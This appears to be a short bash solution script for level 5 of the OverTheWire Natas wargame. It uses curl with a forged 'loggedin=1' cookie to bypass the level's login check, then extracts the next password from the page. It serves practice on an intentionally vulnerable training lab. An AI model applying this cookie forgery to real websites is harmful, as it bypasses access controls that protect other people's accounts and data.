#!/bin/bash
url="http://natas5.natas.labs.overthewire.org"
user="natas5"
pass=$(cat credentials/natas5)


curl -s -b "loggedin=1" -u "$user:$pass" "$url" | html2text | grep "The password" | awk '{print $8}'
